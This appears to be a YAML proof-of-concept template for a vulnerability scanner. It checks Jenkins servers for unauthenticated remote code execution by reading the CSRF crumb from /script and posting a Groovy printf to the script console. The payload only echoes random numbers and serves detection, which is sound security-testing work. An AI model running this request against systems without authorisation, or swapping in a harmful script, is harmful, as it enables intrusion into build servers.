expression: r0() && r1()
id: jenkins-unauthorized-rce
info:
  author: MrP01ntSun(https://github.com/MrPointSun)
  name: Jenkins unauthorized rce
  reference:
  - https://www.cnblogs.com/yuzly/p/11255609.html
  - https://blog.51cto.com/13770310/2156663
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200
    output:
      search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
      var: search["var"]
    request:
      method: GET
      path: /script
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1)
      + "%" + string(r2)))
    request:
      body: 'script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C

        '
      method: POST
      path: /script
set:
  r1: randomInt(1000, 9999)
  r2: randomInt(1000, 9999)
